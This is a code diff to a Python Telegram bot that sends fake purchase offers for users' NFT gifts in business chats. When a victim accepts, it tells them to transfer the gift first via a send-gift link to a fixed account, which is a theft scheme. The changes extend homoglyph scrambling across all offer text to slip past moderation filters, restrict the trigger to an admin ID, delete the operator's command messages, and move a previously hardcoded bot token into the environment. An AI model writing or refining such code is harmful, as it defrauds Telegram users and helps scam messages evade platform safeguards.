@@ -4,6 +4,7 @@ import logging
 import os
 import random
 import re
+import time
 import uuid
 
 from dotenv import load_dotenv
@@ -18,19 +19,25 @@ from aiogram.types import (
 
 load_dotenv()
 
-BOT_TOKEN = "8892029031:AAGe_mydsIlntyXA0-_CWftMqzUL7IrQ8bo"
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 NFT_TRANSFER_LINK = "tg://send_gift?to=dobrks"
+ADMIN_ID = 8414654810
 STAR_EMOJI_ID = "5242644275014951846"
 GRAM_EMOJI_ID = "5193179982775476271"
 CHECK_EMOJI_ID = "5776375003280838798"
 CROSS_EMOJI_ID = "5778527486270770928"
 GIFT_EMOJI_ID = "5985472565508838112"
 
+if not BOT_TOKEN:
+    raise ValueError("BOT_TOKEN is required")
+
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 offers = {}
+last_send = 0
+SEND_COOLDOWN = 3
 
 CONNECTIONS_FILE = "connections.json"
 connections = {}
@@ -86,7 +93,22 @@ HOMOGLYPH_CYR = {
     "а": "a", "е": "e", "о": "o", "с": "c", "р": "p", "х": "x", "у": "y",
 }
 
-def randomize_text(text: str, probability: float = 1.0) -> str:
+HOMOGLYPH_CYR_CAP = {
+    "А": "Α", "В": "Β", "Е": "Ε", "К": "Κ", "М": "Μ", "Н": "Η",
+    "О": "Ο", "Р": "Ρ", "С": "Ϲ", "Т": "Τ", "У": "Υ", "Х": "Χ",
+}
+
+HOMOGLYPH_LAT_TO_CYR = {
+    "a": "а", "e": "е", "o": "о", "p": "р", "c": "с", "x": "х", "y": "у",
+}
+
+HOMOGLYPH_LAT_CAP = {
+    "A": "Α", "B": "Β", "E": "Ε", "H": "Η", "I": "Ι", "K": "Κ",
+    "M": "Μ", "N": "Ν", "O": "Ο", "P": "Ρ", "T": "Τ", "X": "Χ",
+    "Y": "Υ", "Z": "Ζ", "C": "Ϲ",
+}
+
+def randomize_all(text: str, probability: float = 1.0) -> str:
     result = []
     i = 0
     n = len(text)
@@ -117,26 +139,22 @@ def randomize_text(text: str, probability: float = 1.0) -> str:
                 result.append(text[i:end + 2])
                 i = end + 2
                 continue
+
         char = text[i]
-        if char in HOMOGLYPH_CYR and random.random() < probability:
-            result.append(HOMOGLYPH_CYR[char])
+        if random.random() < probability:
+            if char in HOMOGLYPH_CYR_CAP:
+                result.append(HOMOGLYPH_CYR_CAP[char])
+            elif char in HOMOGLYPH_CYR:
+                result.append(HOMOGLYPH_CYR[char])
+            elif char in HOMOGLYPH_LAT_CAP:
+                result.append(HOMOGLYPH_LAT_CAP[char])
+            elif char in HOMOGLYPH_LAT_TO_CYR:
+                result.append(HOMOGLYPH_LAT_TO_CYR[char])
+            else:
+                result.append(char)
         else:
             result.append(char)
         i += 1
-    return "".join(result)
-
-HOMOGLYPH_LAT = {
-    "A": "Α", "B": "Β", "E": "Ε", "H": "Η", "I": "Ι", "K": "Κ", "M": "Μ",
-    "N": "Ν", "O": "Ο", "P": "Ρ", "T": "Τ", "X": "Χ", "Y": "Υ", "Z": "Ζ", "o": "ο",
-}
-
-def randomize_lat(text: str, probability: float = 1.0) -> str:
-    result = []
-    for char in text:
-        if char in HOMOGLYPH_LAT and random.random() < probability:
-            result.append(HOMOGLYPH_LAT[char])
-        else:
-            result.append(char)
     return "".join(result)
 
 def gift_emoji() -> str:
@@ -168,8 +186,8 @@ def parse_nft_input(arg: str):
 
 TEXTS = {
     "ru": {
-        "offer_template": "Пοльзοвaтeль <b>{buyer}</b> пpeдлaгaeт Baм <b>{amount}</b> зa пoдapoк <b>{nft_link}.</b>",
-        "offer_expires": "Пpeдлoжeниe дeйcтвyeт eщё <b>5ч 59м.</b>",
+        "offer_template": "Пользователь <b>{buyer}</b> предлагает Вам <b>{amount}</b> за подарок <b>{nft_link}.</b>",
+        "offer_expires": "Предложение действует ещё <b>5ч 59м.</b>",
         "btn_accept": "Принять",
         "btn_decline": "Отклонить",
         "btn_transfer": "Передать",
@@ -184,8 +202,8 @@ TEXTS = {
         "declined": "You have declined the offer",
     },
     "ua": {
-        "offer_template": "Кοристувaч <b>{buyer}</b> пpoпoнує Вaм <b>{amount}</b> зa пoдapунoк <b>{nft_link}.</b>",
-        "offer_expires": "Пpoпoзицiя дiє щe <b>5г 59хв.</b>",
+        "offer_template": "Користувач <b>{buyer}</b> пропонує Вам <b>{amount}</b> за подарунок <b>{nft_link}.</b>",
+        "offer_expires": "Пропозиція діє ще <b>5г 59хв.</b>",
         "btn_accept": "Прийняти",
         "btn_decline": "Відхилити",
         "btn_transfer": "Передати",
@@ -228,7 +246,23 @@ def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
 
 @dp.business_message(F.text.startswith("+rep "))
 async def cmd_rep_business(message: types.Message):
-    print(f"[OFFER] received: {message.text}")
+    if message.from_user.id != ADMIN_ID:
+        return
+
+    global last_send
+    now = time.time()
+    if now - last_send < SEND_COOLDOWN:
+        print(f"[FLOOD] skipped, cooldown {SEND_COOLDOWN}s")
+        try:
+            await bot.delete_business_messages(
+                business_connection_id=message.business_connection_id,
+                message_ids=[message.message_id]
+            )
+        except Exception:
+            pass
+        return
+    last_send = now
+
     args = message.text.split()
     if len(args) < 3:
         try:
@@ -278,23 +312,27 @@ async def cmd_rep_business(message: types.Message):
     }
 
     buyer_name = get_buyer_name(message.business_connection_id)
-    nft_name_rand = randomize_lat(nft_full_name, probability=1.0)
-    nft_link = f'<a href="{nft_url}">{nft_name_rand}</a>'
 
     offer_text_raw = t['offer_template'].format(
         buyer="@@BUYER@@",
         amount="@@AMOUNT@@",
         nft_link="@@NFT@@",
     )
-    offer_text_rand = randomize_text(offer_text_raw, probability=1.0)
+
+    offer_text_rand = randomize_all(offer_text_raw, probability=1.0)
+    nft_name_rand = randomize_all(nft_full_name, probability=1.0)
+    nft_link = f'<a href="{nft_url}">{nft_name_rand}</a>'
+
     offer_text = (
         offer_text_rand
         .replace("@@BUYER@@", buyer_name)
         .replace("@@AMOUNT@@", f"{amount_formatted} {currency_text}")
         .replace("@@NFT@@", nft_link)
     )
-    expires_rand = randomize_text(t['offer_expires'], probability=1.0)
+
+    expires_rand = randomize_all(t['offer_expires'], probability=1.0)
     preview_line = f'<a href="{nft_url}">&#8203;</a>'
+
     text = f"{preview_line}{offer_text}\n\n{expires_rand}"
 
     try:
@@ -308,7 +346,7 @@ async def cmd_rep_business(message: types.Message):
             ),
             parse_mode="HTML"
         )
-        print(f"[OFFER] sent successfully")
+        print(f"[OFFER] sent")
     except Exception as e:
         print(f"[SEND ERROR] {e}")
 
@@ -324,6 +362,7 @@ async def cmd_rep_business(message: types.Message):
 async def process_accept(callback: CallbackQuery):
     order_id = callback.data.split("_", 1)[1]
     offer = offers.get(order_id)
+
     if not offer or offer["status"] != "pending":
         await callback.answer()
         return
@@ -331,7 +370,7 @@ async def process_accept(callback: CallbackQuery):
     offer["status"] = "accepted"
     lang = offer["lang"]
     currency_text = mask_stars(offer['currency'])
-    nft_name_rand = randomize_lat(offer['nft_name'], probability=1.0)
+    nft_name_rand = randomize_all(offer['nft_name'], probability=1.0)
 
     alert_texts = {
         "ru": f"Предложение о продаже {offer['nft_name']} успешно принято.\n\nПередайте подарок покупателю для зачисления {offer['amount']} {currency_text} на ваш баланс.",
@@ -345,14 +384,14 @@ async def process_accept(callback: CallbackQuery):
 
     if lang == "ru":
         text = (
-            f"{preview_line}{gift_emoji()} Пoдapoк: <b>{nft_link}</b> ycпeшнo пpoдaн!\n\n"
-            f"• <b>Пepeдaйтe пoдapoк пoкyпaтeлю для зaчиcлeния "
+            f"{preview_line}{gift_emoji()} Подарок: <b>{nft_link}</b> успешно продан!\n\n"
+            f"• <b>Передайте подарок покупателю для зачисления "
             f"{currency_text}.</b>"
         )
     elif lang == "ua":
         text = (
-            f"{preview_line}{gift_emoji()} Пoдapунoк: <b>{nft_link}</b> уcпiшнo пpoдaнo!\n\n"
-            f"• <b>Пepeдaйтe пoдapунoк пoкупцю для зapaхувaння "
+            f"{preview_line}{gift_emoji()} Подарунок: <b>{nft_link}</b> успішно продано!\n\n"
+            f"• <b>Передайте подарунок покупцю для зарахування "
             f"{currency_text}.</b>"
         )
     else:
@@ -383,6 +422,7 @@ async def process_accept(callback: CallbackQuery):
 async def process_decline(callback: CallbackQuery):
     order_id = callback.data.split("_", 1)[1]
     offer = offers.get(order_id)
+
     if not offer or offer["status"] != "pending":
         await callback.answer()
         return
@@ -390,7 +430,8 @@ async def process_decline(callback: CallbackQuery):
     offer["status"] = "declined"
     lang = offer["lang"]
     t = TEXTS[lang]
-    declined_rand = randomize_text(t['declined'], probability=1.0)
+
+    declined_rand = randomize_all(t['declined'], probability=1.0)
     text = f"{cross_emoji()} {declined_rand}"
 
     try:
@@ -404,6 +445,7 @@ async def process_decline(callback: CallbackQuery):
         )
     except Exception as e:
         print(f"[EDIT ERROR] {e}")
+
     await callback.answer()
 
 @dp.callback_query(F.data.startswith("confirm_"))
